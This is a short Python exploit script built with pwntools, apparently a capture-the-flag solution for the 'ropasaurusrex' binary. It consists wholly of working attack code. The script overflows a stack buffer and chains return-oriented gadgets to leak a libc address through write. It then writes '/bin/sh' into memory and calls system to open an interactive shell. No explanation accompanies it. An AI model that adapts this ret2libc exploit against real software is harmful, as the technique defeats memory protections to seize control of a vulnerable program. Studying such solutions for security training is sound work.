from pwn import *

p = process('./ropasaurusrex')
e = ELF('./ropasaurusrex')
l = e.libc

pppr = 0x80484b6
ppr = 0x80484b7
pr = 0x80484b8

main = 0x0804841D

payload = 'A'*0x88
payload += 'AAAA'
payload += p32(e.plt['write'])
payload += p32(pppr)
payload += p32(1)
payload += p32(e.got['read'])
payload += p32(4)
payload += p32(main)

p.send(payload)

base = u32(p.recv(4)[-4:])
base = base - l.symbols['read']
#print hex(base)

payload = 'A'*0x88
payload += 'AAAA'
payload += p32(e.plt['read'])
payload += p32(pppr)
payload += p32(0)
payload += p32(e.bss()+0x100)
payload += p32(8)
payload += p32(main)

p.send(payload)
p.send('/bin/sh\x00')

payload = 'A'*0x88
payload += 'AAAA'
payload += p32(base + l.symbols['system'])
payload += p32(pr)
payload += p32(e.bss()+0x100)

p.send(payload)

p.interactive()
